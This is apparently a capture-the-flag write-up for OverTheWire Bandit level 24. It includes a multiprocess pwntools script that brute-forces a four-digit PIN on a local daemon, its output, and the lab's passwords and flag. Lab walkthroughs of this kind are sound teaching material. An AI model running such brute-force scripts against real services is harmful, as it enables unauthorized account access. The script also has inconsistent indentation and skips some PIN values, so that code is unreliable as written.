# Level 24
## Connection
~~~
ssh bandit24@bandit.labs.overthewire.org -p2220
password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
~~~

## Goal
A daemon is listening on port `30002` and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Solution
~~~
bandit24@bandit:~$ echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1234" | nc 127.0.0.1 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
~~~

~~~
bandit24@bandit:~$ mktemp -d
/tmp/tmp.06UABNmjBt
~~~

Create the following script in `/tmp/tmp.06UABNmjBt`:

```python
#!/usr/bin/env python2
from pwn import *
from multiprocessing import Process

password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
host, port = '127.0.0.1', 30002
context.log_level = 'warn' # avoid unncessary connection details

def bruteforce(start, end):
	for i in range(start, end):
		s = remote(host, port)
		s.recv()
		pin = '{:04}'.format(i)
		s.sendline(password + ' ' + pin)
		response = s.recvline()
		if 'Wrong' in response:
			print "[FAIL] PIN: %s" % pin
		else:
			print "[SUCCESS] PIN: %s" % pin
			break
		s.close()

if __name__ == '__main__':
	p1 = Process(target=bruteforce, args=(0,   2000))
	p2 = Process(target=bruteforce, args=(2001,4000))
	p3 = Process(target=bruteforce, args=(4001,6000))
	p4 = Process(target=bruteforce, args=(6001,8000))
	p5 = Process(target=bruteforce, args=(8001,9999))
    p1.start()
    p2.start()
    p3.start()
    p4.start()
    p5.start()
```

*Note: I started with a single process script but after 50 minutes, my connection failed. I modified the range to resume to where it left, but the script kept failing. I then decided to update it with a multiprocessing version and found the password in 15 minutes! The script could be improved but it works...*

Here is the output:
~~~
bandit24@bandit:/tmp/tmp.06UABNmjBt$ python bf.py 
[FAIL] PIN: 6001
[FAIL] PIN: 0000
[FAIL] PIN: 2001
[FAIL] PIN: 4001
[FAIL] PIN: 8001
[FAIL] PIN: 0001
[FAIL] PIN: 2002
[FAIL] PIN: 6002
[FAIL] PIN: 8002
[FAIL] PIN: 4002
[FAIL] PIN: 0002
[FAIL] PIN: 4003
[FAIL] PIN: 6003
[FAIL] PIN: 8003
[FAIL] PIN: 2003
[FAIL] PIN: 0003
[FAIL] PIN: 6004
[FAIL] PIN: 4004
[FAIL] PIN: 8004
...
[FAIL] PIN: 1401
[FAIL] PIN: 7402
[FAIL] PIN: 3401
[FAIL] PIN: 5402
[SUCCESS] PIN: 9403
[FAIL] PIN: 1402
[FAIL] PIN: 7403
[FAIL] PIN: 3402
[FAIL] PIN: 5403
[FAIL] PIN: 1403
[FAIL] PIN: 7404
~~~

Now that we know the password:
~~~
bandit24@bandit:/tmp/tmp.06UABNmjBt$ nc 127.0.0.1 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9403
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
~~~

# Flag
~~~
level25:uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
~~~